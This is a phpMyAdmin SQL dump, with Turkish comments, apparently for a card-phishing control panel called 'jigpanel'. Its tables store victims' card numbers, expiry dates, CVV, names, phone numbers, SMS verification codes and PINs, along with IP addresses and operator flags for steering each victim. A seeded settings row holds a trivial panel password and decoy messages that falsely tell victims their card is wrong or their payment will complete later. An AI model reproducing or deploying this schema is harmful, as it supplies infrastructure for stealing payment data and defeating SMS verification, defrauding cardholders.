-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Anamakine: 127.0.0.1
-- Üretim Zamanı: 12 Tem 2022, 15:28:01
-- Sunucu sürümü: 10.4.24-MariaDB
-- PHP Sürümü: 8.1.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `jigpanel`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ips`
--

CREATE TABLE `ips` (
  `id` bigint(20) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `lastOnline` bigint(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `log`
--

CREATE TABLE `log` (
  `id` int(11) NOT NULL,
  `date` varchar(255) NOT NULL,
  `kk` varchar(255) NOT NULL,
  `ccmonth` varchar(255) NOT NULL,
  `sonkul` varchar(255) NOT NULL,
  `cvv` int(11) NOT NULL,
  `ad` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `money` varchar(255) NOT NULL,
  `sms` varchar(255) NOT NULL,
  `sms2` varchar(255) NOT NULL,
  `pin` varchar(255) NOT NULL,
  `now` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL DEFAULT 'Anasayfada',
  `sound` int(11) NOT NULL DEFAULT 0,
  `back` int(11) NOT NULL DEFAULT 0,
  `go` int(11) NOT NULL DEFAULT 0,
  `ip` varchar(255) NOT NULL,
  `lastOnline` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `sazan`
--

CREATE TABLE `sazan` (
  `id` int(11) NOT NULL,
  `date` varchar(255) NOT NULL,
  `kk` varchar(255) NOT NULL,
  `ccmonth` varchar(255) NOT NULL,
  `sonkul` varchar(255) NOT NULL,
  `cvv` varchar(250) NOT NULL,
  `ad` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `money` varchar(255) NOT NULL,
  `sms` varchar(255) NOT NULL,
  `now` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL DEFAULT 'Anasayfada',
  `back` int(11) NOT NULL DEFAULT 0,
  `go` int(11) NOT NULL DEFAULT 0,
  `ip` varchar(255) NOT NULL,
  `lastOnline` bigint(20) DEFAULT NULL,
  `ban` int(11) NOT NULL,
  `sound` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `site`
--

CREATE TABLE `site` (
  `id` int(11) NOT NULL,
  `pass` text NOT NULL,
  `privpage` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `refresh` int(11) NOT NULL DEFAULT 5,
  `go` int(11) NOT NULL DEFAULT 0,
  `3d` int(11) NOT NULL DEFAULT 0,
  `adi` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `tebrik` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `hata` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `site`
--

INSERT INTO `site` (`id`, `pass`, `privpage`, `refresh`, `go`, `3d`, `adi`, `tebrik`, `hata`) VALUES
(1, '123', 'Kart bilgileriniz hatalı görünüyor. Doğru girdiğinizden Emin Olun. İŞLEMİNİZİ TAMAMLAYAMADIK!', 1000, 0, 0, 'Site Adi1', 'İşleminiz 24 saat içinde tamamlanacak', 'Hata tekrar deneyiniz');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `ips`
--
ALTER TABLE `ips`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `log`
--
ALTER TABLE `log`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `sazan`
--
ALTER TABLE `sazan`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `site`
--
ALTER TABLE `site`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `ips`
--
ALTER TABLE `ips`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `log`
--
ALTER TABLE `log`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `sazan`
--
ALTER TABLE `sazan`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `site`
--
ALTER TABLE `site`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
